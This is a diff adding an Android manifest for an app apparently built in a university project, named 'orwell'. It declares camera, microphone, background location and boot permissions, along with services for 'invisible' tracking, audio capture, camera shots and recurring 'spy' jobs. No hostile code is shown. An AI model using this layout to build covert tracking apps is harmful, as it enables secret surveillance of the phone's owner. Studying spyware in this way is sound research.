@@ -1,0 +1,71 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools"
+    package="ch.zhaw.init.orwell_a">
+
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+
+    <application
+        android:allowBackup="true"
+        android:icon="@mipmap/ic_launcher_eye"
+        android:label="@string/app_name"
+        android:roundIcon="@mipmap/ic_launcher_eye_round"
+        android:supportsRtl="true"
+        android:theme="@style/AppTheme"
+        tools:ignore="GoogleAppIndexingWarning">
+        <activity android:name=".ui.activity.MainActivity" >
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <service android:name=".data.location.LocationTrackerService"
+            android:foregroundServiceType="location">
+            <intent-filter>
+                <action android:name="StartServiceLocationTracking" />
+                <action android:name="GetSinglePositionUpdate" />
+                <action android:name="StopServiceLocationTracking" />
+                <action android:name="StartInvisibleTracking" />
+                <action android:name="StartServiceLocationTrackingVisible" />
+                <action android:name="StartServiceLocation" />
+            </intent-filter>
+        </service>
+        <service android:name=".persistence.PersistenceService" >
+            <intent-filter>
+                <action android:name="StartPersistenceService"/>
+                <action android:name="StartSpyAlarm"/>
+                <action android:name="StartSpyJob"/>
+                <action android:name="StopSpy"/>
+            </intent-filter>
+        </service>
+        <service android:name=".persistence.CustomJobScheduler"
+            android:permission="android.permission.BIND_JOB_SERVICE"/>
+        <service android:name=".data.audio.MicrophoneService">
+            <intent-filter>
+                <action android:name="StartAudioCapturing"/>
+                <action android:name="StopAudioCapturing"/>
+            </intent-filter>
+        </service>
+        <service android:name=".data.camera.CameraService" >
+            <intent-filter>
+                <action android:name="CamFrontBackShot" />
+            </intent-filter>
+        </service>
+        <service android:name=".persistence.CustomJob"
+            android:permission="android.permission.BIND_JOB_SERVICE"/>
+        <service android:name=".data.location.LocationTrackerJob"
+            android:permission="android.permission.BIND_JOB_SERVICE"/>
+
+        <receiver android:name=".persistence.AlarmReceiver" />
+    </application>
+</manifest>
